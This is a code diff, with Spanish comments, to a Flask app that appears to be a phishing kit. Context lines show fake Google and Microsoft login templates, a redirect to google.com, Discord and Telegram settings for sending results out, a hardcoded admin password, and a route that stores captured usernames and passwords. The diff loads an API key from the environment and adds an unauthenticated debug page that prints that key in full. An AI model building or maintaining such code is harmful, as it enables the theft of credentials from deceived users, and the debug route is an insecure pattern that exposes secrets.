@@ -24,13 +24,16 @@ app.config.update(
     PERMANENT_SESSION_LIFETIME=timedelta(hours=2)
 )
 
+# =============================================
+# CONFIGURACIÓN CORREGIDA - LEE VARIABLE DE ENTORNO
+# =============================================
 CONFIG = {
     'discord_webhook': None,
     'telegram_token': None,
     'telegram_chat': None,
     'redirect_url': 'https://www.google.com',
     'template': 'google',
-    'api_key': 'cambia-esta-clave',
+    'api_key': os.environ.get('API_KEY', 'cambia-esta-clave'),  # <--- LEE VARIABLE DE ENTORNO
     'admin_password': 'triple777',
     'max_login_attempts': 5,
     'cleanup_days': 30
@@ -92,6 +95,15 @@ def load_config():
         logger.warning("config.json no encontrado, usando configuración por defecto")
     except Exception as e:
         logger.error(f"Error al cargar config.json: {e}")
+    
+    # =============================================
+    # PRIORIDAD: VARIABLE DE ENTORNO SOBREESCRIBE CONFIG
+    # =============================================
+    if os.environ.get('API_KEY'):
+        CONFIG['api_key'] = os.environ.get('API_KEY')
+        logger.info(f"API_KEY cargada desde variable de entorno: {CONFIG['api_key'][:4]}...")
+    else:
+        logger.warning("API_KEY no encontrada en variables de entorno, usando valor por defecto")
 
 def init_db():
     try:
@@ -207,7 +219,7 @@ def add_security_headers(response):
         response.headers['Content-Security-Policy'] = (
             "default-src 'self'; "
             "style-src 'self' 'unsafe-inline'; "
-            "script-src 'self' 'unsafe-inline'; "  # <--- LÍNEA AGREGADA PARA PERMITIR SCRIPTS
+            "script-src 'self' 'unsafe-inline'; "
             "img-src 'self' https://www.google.com https://i.imgur.com https://aadcdn.msftauth.net; "
             "font-src 'self' https://fonts.gstatic.com; "
             "form-action 'self'; "
@@ -1091,6 +1103,30 @@ def db_insert():
         return f"✅ Credencial guardada: {username} / {password}"
     except Exception as e:
         return f"❌ Error: {e}"
+
+@app.route('/debug-api')
+def debug_api():
+    """Diagnóstico de la API Key"""
+    html = "<h1>🔍 Diagnóstico de API Key</h1>"
+    
+    # Verificar valor en CONFIG
+    html += f"<p>API Key en CONFIG: <code>{CONFIG.get('api_key', 'NO DEFINIDA')}</code></p>"
+    
+    # Verificar variable de entorno directa
+    env_key = os.environ.get('API_KEY', 'NO ENCONTRADA')
+    html += f"<p>API Key en entorno: <code>{env_key}</code></p>"
+    
+    # Verificar si coinciden
+    if CONFIG.get('api_key') == env_key:
+        html += "<p style='color:green'>✅ La API Key en CONFIG coincide con la variable de entorno</p>"
+    else:
+        html += "<p style='color:red'>❌ ¡NO coinciden! La variable de entorno no se está cargando correctamente</p>"
+    
+    # Verificar la cabecera de la petición actual
+    received_key = request.headers.get('X-API-Key', 'NO ENVIADA')
+    html += f"<p>API Key recibida en esta petición: <code>{received_key}</code></p>"
+    
+    return html
 
 if __name__ == '__main__':
     load_config()
